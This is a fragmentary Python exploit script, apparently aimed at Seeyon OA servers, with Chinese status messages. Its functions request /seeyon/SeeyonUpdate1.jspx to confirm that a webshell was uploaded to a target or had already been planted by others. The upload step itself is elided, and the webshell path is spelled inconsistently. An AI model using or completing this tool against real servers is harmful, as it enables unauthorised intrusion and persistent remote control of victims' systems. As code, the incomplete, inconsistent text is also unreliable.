...
webshell地址: http://xxx.xxx.xxx.xxx/seeyon/SeeyouUpdate1.jspx
```
...
def test_webshell(target_url):
    webshell_url = target_url + "/seeyon/SeeyonUpdate1.jspx"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        ...
        print("\033[32m[o] 正在请求 : {}/seeyon/SeeyonUpdate1.jspx\033[0m".format(target_url))
        if response.status_code == 200:
            print("\033[32m[o] 目标 {} 成功上传 webshell : {}/seeyon/SeeyonUpdate1.jspx\033[0m".format(target_url,target_url))
        else:
...
def test_webshell_ok(target_url):
    webshell_url = target_url + "/seeyon/SeeyonUpdate1.jspx"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        ...
        response = requests.get(url=webshell_url, timeout=10, verify=False, headers=headers)
        if response.status_code == 200:
            print("\033[32m[o] 目标 {} 可能已经被其他人成功上传 webshell \033[0m".format(target_url))
            print("\033[32m[o] webshell地址：{}/seeyon/SeeyonUpdate1.jspx \033[0m".format(target_url))
